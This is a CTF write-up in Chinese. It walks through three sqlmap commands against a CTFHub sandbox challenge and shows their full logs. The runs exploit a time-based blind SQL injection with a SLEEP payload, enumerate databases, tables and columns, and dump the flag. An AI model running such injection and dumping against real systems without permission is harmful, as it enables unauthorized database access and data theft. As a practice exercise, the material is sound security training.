### 1、获取数据库名称
```shell script
Oswald:sqlmap-dev oliver$ python3 sqlmap.py -u "http://challenge-5f2becc9163aa3a6.sandbox.ctfhub.com:10800/?id=1" --dbs
```
```shell script
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.1.7#dev}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:28:31 /2022-03-09/

[21:28:32] [INFO] resuming back-end DBMS 'mysql' 
[21:28:32] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 8890 FROM (SELECT(SLEEP(5)))nRod)
---
[21:28:32] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty 1.19.3.2, PHP 7.3.14
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[21:28:32] [INFO] fetching database names
[21:28:32] [INFO] fetching number of databases
[21:28:32] [INFO] resumed: 4
[21:28:32] [INFO] resuming partial value: inf
[21:28:32] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[21:28:45] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[21:28:55] [INFO] adjusting time delay to 1 second due to good response times
ormation_schema
[21:29:49] [INFO] retrieved: mysql
[21:30:09] [INFO] retrieved: performance_schema
[21:31:14] [INFO] retrieved: sqli
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli

[21:31:29] [INFO] fetched data logged to text files under '/Users/oliver/.local/share/sqlmap/output/challenge-5f2becc9163aa3a6.sandbox.ctfhub.com'

[*] ending @ 21:31:29 /2022-03-09/
```
### 2、获取对应数据库表的名称
```shell script
Oswald:sqlmap-dev oliver$ python3 sqlmap.py -u "http://challenge-5f2becc9163aa3a6.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables
```
```shell script
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.1.7#dev}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:33:24 /2022-03-09/

[21:33:24] [INFO] resuming back-end DBMS 'mysql' 
[21:33:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 8890 FROM (SELECT(SLEEP(5)))nRod)
---
[21:33:25] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.14, OpenResty 1.19.3.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[21:33:25] [INFO] fetching tables for database: 'sqli'
[21:33:25] [INFO] fetching number of tables for database 'sqli'
[21:33:25] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[21:33:26] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
2
[21:33:50] [INFO] retrieved: 
[21:33:55] [INFO] adjusting time delay to 1 second due to good response times
flag
[21:34:08] [INFO] retrieved: news
Database: sqli
[2 tables]
+------+
| flag |
| news |
+------+

[21:34:25] [INFO] fetched data logged to text files under '/Users/oliver/.local/share/sqlmap/output/challenge-5f2becc9163aa3a6.sandbox.ctfhub.com'

[*] ending @ 21:34:25 /2022-03-09/

```
### 3、获取对应数据库，对应表的，所有字段信息
```shell script
Oswald:sqlmap-dev oliver$ python3 sqlmap.py -u "http://challenge-5f2becc9163aa3a6.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns --dump
```
```shell script
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.1.7#dev}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:35:36 /2022-03-09/

[21:35:37] [INFO] resuming back-end DBMS 'mysql' 
[21:35:37] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 8890 FROM (SELECT(SLEEP(5)))nRod)
---
[21:35:37] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty 1.19.3.2, PHP 7.3.14
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[21:35:37] [INFO] fetching columns for table 'flag' in database 'sqli'
[21:35:37] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[21:35:39] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
1
[21:36:08] [INFO] retrieved: 
[21:36:19] [INFO] adjusting time delay to 1 second due to good response times
flag
[21:36:31] [INFO] retrieved: varchar(100)
Database: sqli
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(100) |
+--------+--------------+

[21:37:11] [INFO] fetching columns for table 'flag' in database 'sqli'
[21:37:11] [INFO] resumed: 1
[21:37:11] [INFO] resumed: flag
[21:37:11] [INFO] fetching entries for table 'flag' in database 'sqli'
[21:37:11] [INFO] fetching number of entries for table 'flag' in database 'sqli'
[21:37:11] [INFO] retrieved: 1
[21:37:13] [WARNING] reflective value(s) found and filtering out of statistical model, please wait            
.............................. (done)
ctfhub{7d97a14ae3c74e26dabaf548}
Database: sqli
Table: flag
[1 entry]
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{7d97a14ae3c74e26dabaf548} |
+----------------------------------+

[21:39:25] [INFO] table 'sqli.flag' dumped to CSV file '/Users/oliver/.local/share/sqlmap/output/challenge-5f2becc9163aa3a6.sandbox.ctfhub.com/dump/sqli/flag.csv'
[21:39:25] [INFO] fetched data logged to text files under '/Users/oliver/.local/share/sqlmap/output/challenge-5f2becc9163aa3a6.sandbox.ctfhub.com'

[*] ending @ 21:39:25 /2022-03-09/

```